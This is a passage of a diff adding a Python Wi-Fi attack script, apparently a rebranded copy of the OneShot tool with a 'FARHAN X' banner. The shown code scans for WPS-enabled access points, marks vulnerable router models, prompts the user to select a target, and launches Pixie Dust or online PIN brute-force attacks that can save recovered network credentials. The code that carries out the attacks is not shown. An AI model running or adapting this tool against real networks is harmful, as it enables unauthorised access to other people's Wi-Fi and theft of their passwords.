+            elif sec == 'WPA2':
+                if result.group(1) == 'WPA':
+                    sec = 'WPA/WPA2'
+            networks[-1]['Security type'] = sec
+
+        def handle_wps(line, result, networks):
+            networks[-1]['WPS'] = result.group(1)
+
+        def handle_wpsLocked(line, result, networks):
+            flag = int(result.group(1), 16)
+            if flag:
+                networks[-1]['WPS locked'] = True
+
+        def handle_model(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        def handle_modelNumber(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        def handle_deviceName(line, result, networks):
+            d = result.group(1)
+            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        cmd = 'iw dev {} scan'.format(self.interface)
+        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        lines = proc.stdout.splitlines()
+        networks = []
+        matchers = {
+            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
+            re.compile(r'SSID: (.*)'): handle_essid,
+            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
+            re.compile(r'(capability): (.+)'): handle_securityType,
+            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
+            re.compile(r' [*] Model: (.*)'): handle_model,
+            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
+            re.compile(r' [*] Device name: (.*)'): handle_deviceName
+        }
+
+        for line in lines:
+            if line.startswith('command failed:'):
+                print('[!] Error:', line)
+                return False
+            line = line.strip('\t')
+            for regexp, handler in matchers.items():
+                res = re.match(regexp, line)
+                if res:
+                    handler(line, res, networks)
+
+        # Filtering non-WPS networks
+        networks = list(filter(lambda x: bool(x['WPS']), networks))
+        if not networks:
+            return False
+
+        # Sorting by signal level
+        networks.sort(key=lambda x: x['Level'], reverse=True)
+
+        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
+        network_list = {(i + 1): network for i, network in enumerate(networks)}
+
+        # Printing scanning results as table
+        def truncateStr(s, length, postfix='…'):
+            """
+            Truncate string with the specified length
+            @s — input string
+            @length — length of output string
+            """
+            if len(s) > length:
+                k = length - len(postfix)
+                s = s[:k] + postfix
+            return s
+
+        def colored(text, color=None):
+            """Returns colored text"""
+            if color:
+                if color == 'green':
+                    text = '\033[92m{}\033[00m'.format(text)
+                elif color == 'red':
+                    text = '\033[91m{}\033[00m'.format(text)
+                elif color == 'yellow':
+                    text = '\033[93m{}\033[00m'.format(text)
+                else:
+                    return text
+            else:
+                return text
+            return text
+
+        if self.vuln_list:
+            print('Network marks: {1} {0} {2} {0} {3}'.format(
+                '|',
+                colored('Possibly vulnerable', color='green'),
+                colored('WPS locked', color='red'),
+                colored('Already stored', color='yellow')
+            ))
+        print('Networks list:')
+        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+        print ('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+         
+
+        network_list_items = list(network_list.items())
+        if args.reverse_scan:
+            network_list_items = network_list_items[::-1]
+        for n, network in network_list_items:
+            number = f'[{n}] '
+            model = '{} {}'.format(network['Model'], network['Model number'])
+            essid = truncateStr(network['ESSID'], 25)
+            deviceName = truncateStr(network['Device name'], 27)
+            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+                number, network['BSSID'], essid,
+                network['Security type'], network['Level'],
+                deviceName, model
+                )
+            if (network['BSSID'], network['ESSID']) in self.stored:
+                print(colored(line, color='yellow'))
+            elif network['WPS locked']:
+                print(colored(line, color='red'))
+            elif self.vuln_list and (model in self.vuln_list):
+                print(colored(line, color='green'))
+            else:
+                print(line)
+
+        return network_list
+
+    def prompt_network(self) -> str:
+        os.system('clear')
+        print('''
+
+██╗░░░██╗░█████╗░██████╗░
+╚██╗░██╔╝██╔══██╗██╔══██╗
+░╚████╔╝░███████║██████╔╝
+░░╚██╔╝░░██╔══██║██╔══██╗
+░░░██║░░░██║░░██║██║░░██║
+░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝ \033[1;36mFARHAN X\n\t\t[\033[1;32mYAR\033[1;37m] 
+                                                    \n\t\t[\033[1;32m*\033[1;37m] NAME        : FARHAN MUH TASIM\n\t\t[\033[1;32m*\033[1;37m] WORK ONLY   : GREEN-COLOR WIFI\n\t\t[\033[1;32m*\033[1;37m] Create  by  : Farhan \n\t\t[\033[1;32m*\033[1;37m] Version     : FARHAN2.0 \n\t\t[\033[1;32m*\033[1;37m] FACEBOOK    : @FARHAN MUH TASIM \n''')
+        networks = self.iw_scanner()
+        if not networks:
+            ani('[\033[1;31m-\033[1;37m] No WPS networks found!')
+            ani('[\033[1;33mi\033[1;37m] Turn on wifi for some moment then turn off!')
+            ani('[\033[1;33mi\033[1;37m] Turn on your hotspot if turned off!')
+            ani('[\033[1;33mi\033[1;37m] Turn off location if turned on!')
+            for i in range(4, -1,-1):
+              sys.stdout.write("\r[\033[1;33m+\033[1;37m] Auto restarting in [\033[1;33m"+str(i+1)+"\033[1;37m] second!")
+              time.sleep(1)
+              sys.stdout.flush()
+            return self.prompt_network()
+        while 1:
+            try:
+                print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+                networkNo = input('[\033[1;33m?\033[1;37m] Select target (press Enter to refresh): ')
+                if networkNo.lower() in ('r', '0', ''):
+                    return self.prompt_network()
+                elif int(networkNo) in networks.keys():
+                    return networks[int(networkNo)]['BSSID']
+                else:
+                    raise IndexError
+            except Exception:
+                print('[\033[1;31m!\033[1;37m] Invalid number')
+
+
+def ifaceUp(iface, down=False):
+    if down:
+        action = 'down'
+    else:
+        action = 'up'
+    cmd = 'ip link set {} {}'.format(iface, action)
+    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    if res.returncode == 0:
+        return True
+    else:
+        return False
+
+
+def die(msg):
+    sys.stderr.write(msg + '\n')
+    sys.exit(1)
+
+
+def usage():
+    return """
+FARHAN 0.0.2 (c) 2017 rofl0r (modified).
+
+%(prog)s <arguments>
+
+Required arguments:
+    -i, --interface=<wlan0>  : Name of the interface to use
+
+Optional arguments:
+    -b, --bssid=<mac>        : BSSID of the target AP
+    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
+    -K, --pixie-dust         : Run Pixie Dust attack
+    -B, --bruteforce         : Run online bruteforce attack
+
+Advanced arguments:
+    -d, --delay=<n>          : Set the delay between pin attempts [0]
+    -w, --write              : Write AP credentials to the file on success
+    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
+    -X, --show-pixie-cmd     : Always print Pixiewps command
+    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
+    --iface-down             : Down network interface when the work is finished
+    -l, --loop               : Run in a loop
+    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
+    -v, --verbose            : Verbose output
+
+Example:
+    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
+"""
+
+
+if __name__ == '__main__':
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        description='OneShotPin 0.0.2 (c) 2017 rofl0r (modified).',
+        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
+        )
+
+    parser.add_argument(
+        '-i', '--interface',
+        type=str,
+        required=True,
+        help='Name of the interface to use'
+        )
+    parser.add_argument(
+        '-b', '--bssid',
+        type=str,
+        help='BSSID of the target AP'
+        )
+    parser.add_argument(
+        '-p', '--pin',
+        type=str,
+        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
+        )
+    parser.add_argument(
+        '-K', '--pixie-dust',
+        action='store_true',
+        help='Run Pixie Dust attack'
+        )
+    parser.add_argument(
+        '-F', '--pixie-force',
+        action='store_true',
+        help='Run Pixiewps with --force option (bruteforce full range)'
+        )
+    parser.add_argument(
+        '-X', '--show-pixie-cmd',
+        action='store_true',
+        help='Always print Pixiewps command'
+        )
+    parser.add_argument(
+        '-B', '--bruteforce',
+        action='store_true',
+        help='Run online bruteforce attack'
+        )
+    parser.add_argument(
+        '-d', '--delay',
+        type=float,
+        help='Set the delay between pin attempts'
+        )
+    parser.add_argument(
+        '-w', '--write',
+        action='store_true',
+        help='Write credentials to the file on success'
+        )
+    parser.add_argument(
+        '--iface-down',
+        action='store_true',
+        help='Down network interface when the work is finished'
+        )
+    parser.add_argument(
+        '--vuln-list',
+        type=str,
+        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
+        help='Use custom file with vulnerable devices list'
+    )
+    parser.add_argument(
+        '-l', '--loop',
+        action='store_true',
+        help='Run in a loop'
+    )
+    parser.add_argument(
+        '-r', '--reverse-scan',
+        action='store_true',
+        help='Reverse order of networks in the list of networks. Useful on small displays'
+    )
+    parser.add_argument(
+        '-v', '--verbose',
+        action='store_true',
+        help='Verbose output'
+        )
+
+    args = parser.parse_args()
+
+    if sys.hexversion < 0x03060F0:
+        die("The program requires Python 3.6 and above")
+    if os.getuid() != 0:
+        die("Run it as root")
+
+    if not ifaceUp(args.interface):
+        die('Unable to up interface "{}"'.format(args.interface))
+
+    while True:
+        try:
+            if not args.bssid:
+                try:
+                    with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                        vuln_list = file.read().splitlines()
+                except FileNotFoundError:
+                    vuln_list = []
+                scanner = WiFiScanner(args.interface, vuln_list)
+                if not args.loop:
+                    print('[\033[1;33m*\033[1;37m] BSSID not specified (--bssid) — scanning for available networks')
+                args.bssid = scanner.prompt_network()
+
+            if args.bssid:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                if args.bruteforce:
+                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                else:
+                    companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                                args.show_pixie_cmd, args.pixie_force)
+            if not args.loop:
+                break
+            else:
+                args.bssid = None
+        except KeyboardInterrupt:
+            if args.loop:
+                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
+                    ani("\n[\033[1;31m!\033[1;37m] Aborting…")
+                    break
+                else:
+                    args.bssid = None
+            else:
+                ani("\n[\033[1;31m!\033[1;37m]Aborting…")
+                break
+
+    if args.iface_down:
+        ifaceUp(args.interface, down=True)
